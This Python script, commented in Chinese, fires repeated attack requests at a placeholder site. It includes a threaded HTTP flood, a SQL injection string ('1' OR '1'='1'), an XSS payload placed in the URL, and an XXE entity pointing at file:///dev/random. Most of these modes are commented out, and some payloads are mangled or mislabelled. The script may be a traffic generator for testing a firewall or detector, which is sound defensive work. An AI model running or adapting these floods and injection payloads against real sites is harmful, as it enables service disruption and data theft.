import requests
import threading
from time import sleep
import time

TARGET_URL = "http://testing.com/"   # 目標網址
FLOOD_COUNT = 510                    # Flood 請求次數
SQLI_COUNT = 30                     # SQLi 請求次數
XSS_COUNT = 35                       # XSS 請求次數
DS_COUNT = 15                        # DS 請求次數
THREADS = 10                         # 多執行緒數量（Flood用）


def http_flood(url, count):
    for i in range(count):
        try:
            requests.get(url, timeout=2)
            time.sleep(0.1)
        except Exception as e:
            print(f"[Flood] Request {i+1} failed: {e}")

def sql_injection(url, count):
    for i in range(count):
        try:
            requests.get(url, timeout=2)
            sleep(0.1) 
        except Exception as e:
            print(f"[SQLi] Request {i+1} failed: {e}")

def xss_attack(url, count):
    for i in range(count):
        try:
            requests.get(url, timeout=2)
            sleep(0.1)
        except Exception as e:
            print(f"[XSS] Request {i+1} failed: {e}")

def http_flood_attack(url, count, threads):
    def attack():
        for _ in range(count // threads):
            try:
                requests.get(url, timeout=2)
                time.sleep(0.1)
            except Exception as e:
                print(f"[Flood] Request failed: {e}")
    thread_list = []
    for _ in range(threads):
        t = threading.Thread(target=attack)
        t.start()
        thread_list.append(t)
    for t in thread_list:
        t.join()
    print("HTTP Flood 測試完成！\n")

def ds_attack(url, count):
    for i in range(count):
        try:
            requests.get(url, timeout=2)
            sleep(0.1)
        except Exception as e:
            print(f"[SQLi] Request {i+1} failed: {e}")

if __name__ == "__main__":
    #print("\n==== HTTP Flood 測試 ====")
    #http_flood_attack(TARGET_URL, FLOOD_COUNT, THREADS)
    #print("==== SQL Injection 測試 ====")
    #sqli_url = TARGET_URL + "?id=1'+OR+'1'='1"
    #sql_injection(sqli_url, SQLI_COUNT)
    #print("SQL Injection 測試完成！\n")

    print("==== XSS 測試 ====")
    xss_url = TARGET_URL + "<;IMG SRC=\";mocha:[code]\";>;"
    xss_attack(xss_url, XSS_COUNT)
    print("XSS 測試完成！\n")

    #print("==== DS Attack 測試 ====")
    #ds_url = TARGET_URL + "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"file:///dev/random\">]><foo>&xee;</foo>"
    #ds_attack(ds_url, DS_COUNT)
    #print("DS Attack 測試完成！\n")
    #<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"file:///dev/random\">]><foo>&xee;</foo>